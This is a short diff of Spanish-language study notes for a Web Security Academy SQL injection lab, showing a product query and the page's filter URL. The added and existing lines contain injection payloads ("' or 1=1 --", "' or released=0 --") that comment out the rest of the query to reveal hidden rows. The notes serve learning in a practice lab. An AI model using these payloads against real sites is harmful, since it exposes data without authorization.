@@ -6,7 +6,7 @@ describe products; => Describimos la tabla productos
 insert into products (category,released) values ("Corporate gifts",1); => Insertar productos
 select * from products; => Seleccionar productos
 
-
 https://0a4300960321338c81c2acd200320021.web-security-academy.net/filter?category=Corporate+gifts
 SELECT * FROM products WHERE category = 'Corporate gifts' AND released = 1; => Esta es la consulta que se realiza en la url de la página
+filter?category=Corporate+gifts' or 1=1 -- => Esto es para comentar el resto de la query
 filter?category=Corporate+gifts' or released=0 --; => Se agrega una comilla simple adicional después de la categoría y el comentario debe ir antes del ;
